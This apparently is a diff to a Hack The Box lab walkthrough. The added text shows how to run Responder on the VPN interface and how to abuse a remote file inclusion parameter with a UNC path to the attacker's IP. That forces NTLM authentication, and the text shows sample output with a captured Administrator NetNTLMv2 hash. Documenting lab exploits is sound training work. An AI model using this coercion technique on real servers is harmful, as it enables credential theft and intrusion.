@@ -189,7 +189,6 @@ First, we identify our VPN network interface using the following command:
 
 The VPN interface used by Hack The Box is typically tun0.
 
-
 Once identified, we start Responder on this interface:
 
 <pre>sudo responder -I tun0</pre> 
@@ -197,16 +196,52 @@ Once identified, we start Responder on this interface:
 At this point, Responder is actively listening for incoming SMB/HTTP authentication requests, waiting for a client to attempt authentication.
 
 We leave Responder running in the background.
+
 ![Responder is listening](img/responder-listening.jpg) 
 
-We start Responder on our VPN interface:
 
-<pre>sudo responder -I tun0 </pre>
+**Step 2: Forcing NTLM Authentication**
 
-Then we trigger the RFI payload in the browser.
-Responder captures an NTLMv2 hash:
+Next, we force the target server to authenticate to our machine.
 
-Administrator::RESPONDER:NTLMv2_HASH
+The web application dynamically includes files using the page parameter. Instead of specifying a local file, we provide a remote resource pointing to our own IP address:
+
+<pre>http://unika.htb/index.php?page=//10.10.14.X/test</pre>
 
 
+**What Happens Internally**
 
+When this request is processed:
+
+- PHP attempts to include a remote file
+
+- The Windows server tries to access the remote resource
+
+- Windows automatically attempts authentication using NTLM
+
+- Responder intercepts and captures the NTLM authentication attempt
+
+**Step 3: Capturing the NTLM Hash**
+
+If the attack is successful, Responder will display output similar to the following:
+
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:32ba78861403f64e:93B51969DF1706B40DE56E79140B01DB:01010000...
+
+![Responder captured hash](img/responder-hash-capturado.jpg)  responder-hash-capturado
+
+From this, we obtain:
+
+Username: Administrator
+
+Authentication type: NetNTLMv2
+
+Credential format: Hashed (not plaintext)
+
+This confirms that:
+
+The Windows server attempted to authenticate
+
+We successfully captured an NTLM authentication hash
+
+The compromised account is Administrator
